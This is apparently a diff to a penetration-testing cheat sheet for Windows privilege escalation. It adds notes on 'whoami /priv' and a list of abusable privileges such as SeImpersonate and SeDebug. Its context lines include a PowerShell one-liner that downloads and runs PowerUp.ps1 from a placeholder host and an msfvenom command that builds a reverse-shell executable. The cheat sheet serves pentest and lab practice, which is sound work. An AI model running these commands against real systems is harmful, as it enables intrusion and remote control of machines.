@@ -143,8 +143,19 @@ git clone https://github.com/worawit/MS17-010.git
  
  * Numbers of cores of processors: 
    ##### WMIC CPU Get DeviceID,NumberOfCores,NumberOfLogicalProcessors
+ 
+ * Windows Privileges:
+   ##### whoami /priv
+   * More info here: https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf
+    * SeDebugPrivilege
+    * SeRestorePrivilege
+    * SeBackupPrivilege
+    * SeTakeOwnershipPrivilege
+    * SeTcbPrivilege
+    * SeCreateToken Privilege
+    * SeLoadDriver Privilege
+    * SeImpersonate & SeAssignPrimaryToken Priv.
    
-
  * Windows-Exploit-Suggester
    * python windows-exploit-suggester.py --database 2020-08-09-mssb.xls --systeminfo grandpa.txt
  
@@ -163,7 +174,7 @@ git clone https://github.com/worawit/MS17-010.git
    * Config: add to the last line the "Invoke-AllChecks"
    * Download and run PowerUp:
      ##### echo IEX(New-Object Net.WebClient).DownloadString('http://\<ip>:\<port>/PowerUp.ps1') | powershell -noprofile -
-     
+
 ## MSFVENOM
 ### EXE
 ##### msfvenom -p windows/shell_reverse_tcp LHOST=\<ip> LPORT=\<port> -f exe > shell.exe
